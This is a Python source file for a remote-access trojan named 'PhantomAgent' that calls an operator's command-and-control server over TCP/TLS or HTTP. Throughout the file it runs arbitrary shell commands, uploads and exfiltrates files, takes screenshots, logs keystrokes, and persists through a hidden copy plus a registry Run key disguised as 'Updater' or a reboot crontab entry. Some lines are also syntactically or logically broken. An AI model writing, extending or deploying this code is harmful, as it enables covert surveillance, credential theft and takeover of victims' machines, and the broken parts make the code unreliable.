import socket, ssl, json, time, base64, os, sys, platform, subprocess, secrets, requests, threading, struct, shutil
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes
import pyscreenshot, pynput.keyboard

CURVE = ec.SECP256R1()
def _generate_ecdh_key_pair():
    private = ec.generate_private_key(CURVE, default_backend())
    public = private.public_key()
    return private, public
def _derive_shared_key(private_key, peer_public_bytes):
    try: peer_public = ec.EllipticCurvePublicKey.from_encoded_point(CURVE, peer_public_bytes)
    except: peer_public = serialization.load_pem_public_key(peer_public_bytes, default_backend())
    shared = private_key.exchange(ec.ECDH(), peer_public)
    hkdf = HKDF(algorithm=hashes.SHA256(), length=32, salt=None, info=b'netsekhmet-v4')
    return base64.urlsafe_b64encode(hkdf.derive(shared))

EXPECTED_FINGERPRINT = os.environ.get('C2_FINGERPRINT', '')

class PhantomAgent:
    def __init__(self, c2_host, c2_port=8443, proto='tcp'):
        self.host = c2_host; self.port = c2_port; self.proto = proto; self.fernet = None
        self.aid = secrets.token_hex(8); self.run = True; self.heartbeat_interval = 30 + secrets.randbelow(10)
        self.keylogger = None
    def connect(self):
        if self.proto == 'http': self._http_loop()
        else: self._tcp_loop()
    def _tcp_loop(self):
        while self.run:
            try:
                ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                sock = socket.create_connection((self.host, self.port), 30)
                ssock = ctx.wrap_socket(sock)
                private, public = _generate_ecdh_key_pair()
                pub_bytes = public.public_bytes(encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo)
                ssock.send(json.dumps({'ecdh_pub': base64.b64encode(pub_bytes).decode()}).encode())
                resp = json.loads(ssock.recv(4096).decode())
                server_pub = serialization.load_pem_public_key(base64.b64decode(resp['ecdh_pub']))
                fp = base64.b64encode(hashes.Hash(hashes.SHA256()).update(server_pub.public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)).finalize()).decode()
                if EXPECTED_FINGERPRINT and fp != EXPECTED_FINGERPRINT:
                    print(f"[!] Server fingerprint mismatch! Expected {EXPECTED_FINGERPRINT}, got {fp}")
                    break
                self.fernet = Fernet(_derive_shared_key(private, base64.b64decode(resp['ecdh_pub'])))
                self._send_enc(ssock, {'action':'register','agent_id':self.aid,'hostname':platform.node(),'os':platform.system()})
                threading.Thread(target=self._heartbeat_tcp, args=(ssock,), daemon=True).start()
                self._tcp_session(ssock)
            except Exception as e:
                print(f"Connection error: {e}")
                time.sleep(10)
    def _send_enc(self, sock, data):
        payload = self.fernet.encrypt(json.dumps(data).encode())
        sock.send(struct.pack(">I", len(payload)) + payload)
    def _recv_enc(self, sock):
        raw = sock.recv(4)
        if not raw: return None
        length = struct.unpack(">I", raw)[0]
        return json.loads(self.fernet.decrypt(sock.recv(length)).decode())
    def _heartbeat_tcp(self, sock):
        while self.run:
            try: self._send_enc(sock, {'action':'heartbeat','agent_id':self.aid})
            except: break
            time.sleep(self.heartbeat_interval)
    def _tcp_session(self, sock):
        while self.run:
            try:
                cmd = self._recv_enc(sock)
                if not cmd: break
                result = self._execute(cmd.get('action'), cmd.get('args',{}))
                self._send_enc(sock, {'action':'cmd_result','result':result})
            except: break
    def _http_loop(self):
        while self.run:
            try:
                session = requests.Session()
                private, public = _generate_ecdh_key_pair()
                pub_bytes = public.public_bytes(encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo)
                resp = session.post(f"http://{self.host}:{self.port}/keyexchange",
                                   json={'ecdh_pub': base64.b64encode(pub_bytes).decode(), 'agent_id': self.aid})
                if resp.status_code != 200: continue
                data = resp.json()
                server_pub = serialization.load_pem_public_key(base64.b64decode(data['ecdh_pub']))
                fp = base64.b64encode(hashes.Hash(hashes.SHA256()).update(server_pub.public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)).finalize()).decode()
                if EXPECTED_FINGERPRINT and fp != EXPECTED_FINGERPRINT:
                    print("Fingerprint mismatch!"); break
                self.fernet = Fernet(_derive_shared_key(private, base64.b64decode(data['ecdh_pub'])))
                self._http_send(session, {'action':'register','agent_id':self.aid,'hostname':platform.node(),'os':platform.system()})
                while self.run:
                    try:
                        resp = session.get(f"http://{self.host}:{self.port}/task", headers={'X-Agent-ID':self.aid})
                        if resp.status_code == 200 and resp.text:
                            cmd = json.loads(self.fernet.decrypt(resp.content).decode())
                            result = self._execute(cmd.get('action'), cmd.get('args',{}))
                            self._http_send(session, {'action':'cmd_result','result':result})
                    except: pass
                    time.sleep(5)
            except Exception as e:
                print(f"HTTP error: {e}")
                time.sleep(10)
    def _http_send(self, session, data):
        payload = self.fernet.encrypt(json.dumps(data).encode())
        session.post(f"http://{self.host}:{self.port}/data", data=payload, headers={'X-Agent-ID':self.aid})
    def _execute(self, action, args):
        try:
            if action == 'shell': return subprocess.run(['/bin/sh', '-c', args['cmd']], capture_output=True, text=True, timeout=30).stdout
            elif action == 'upload': with open(args['path'],'wb') as f: f.write(base64.b64decode(args['data'])); return 'Ok'
            elif action == 'download': with open(args['path'],'rb') as f: return base64.b64encode(f.read()).decode()
            elif action == 'persist': return self._add_persistence()
            elif action == 'screenshot':
                img = pyscreenshot.grab()
                img.save('/tmp/screenshot.png')
                with open('/tmp/screenshot.png','rb') as f: return base64.b64encode(f.read()).decode()
            elif action == 'keylog_start': self._start_keylogger(); return "Keylogger started"
            elif action == 'keylog_stop': self._stop_keylogger(); return "Keylogger stopped"
        except Exception as e: return str(e)
        return 'Unknown'
    def _add_persistence(self):
        hidden_dir = os.path.join(os.path.expanduser("~"), ".hidden")
        os.makedirs(hidden_dir, exist_ok=True)
        dest = os.path.join(hidden_dir, "agent.py")
        shutil.copy2(__file__, dest)
        if platform.system() == 'Windows':
            import winreg; key = winreg.HKEY_CURRENT_USER; subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey: winreg.SetValueEx(regkey, "Updater", 0, winreg.REG_SZ, dest)
        else:
            cron_line = f"@reboot python3 {dest} &\n"
            with open('/tmp/cron_titan','w') as f: f.write(cron_line)
            subprocess.run(['crontab','/tmp/cron_titan'])
        return "Persistence added"
    def _start_keylogger(self):
        self.keylogger = pynput.keyboard.Listener(on_press=self._on_key_press)
        self.keylogger.start()
    def _stop_keylogger(self):
        if self.keylogger: self.keylogger.stop()
    def _on_key_press(self, key):
        try:
            with open('/tmp/keylog.txt','a') as f:
                f.write(str(key.char))
        except: pass
